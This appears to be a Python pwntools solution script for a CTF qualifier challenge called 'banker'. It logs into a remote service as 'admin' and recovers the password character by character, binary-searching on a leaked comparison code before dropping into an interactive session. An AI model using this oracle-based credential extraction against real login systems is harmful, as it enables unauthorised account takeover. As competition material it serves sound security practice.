import struct
from pwn import *

s = remote("banker_15d6ba5840307520a36aabed33e00841.quals.shallweplayaga.me", 9252)
#s = process("")

rw = lambda x: s.recvuntil(x)

def sw(x):
    s.send(x)
    return x


cs = " 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
pw = [0]*8

k=0
end=0
while end==0:
    low = 0
    high = len(cs)-1
    while low<high:
        mid = (low+high)/2
        if high-low == 1:
            pw[k] = mid
            k+=1
            break
        pw[k] = mid
        print rw("username: ")
        print sw("admin\n")
        print rw("password: ")
        pwd = "".join([cs[pw[i]] for i in range(len(pw))])
        print sw(pwd+"\n")
        res = rw("\n")
        if res.find("delayed") >0:
            res = rw("\n")
        if res.find("code=") > 0:
            err = int(res[res.find("code=")+5:])
            print err
            if err == 1:
                low = mid
            elif err == -1:
                high = mid
        else:
            print res
            end=1
            break


s.interactive()
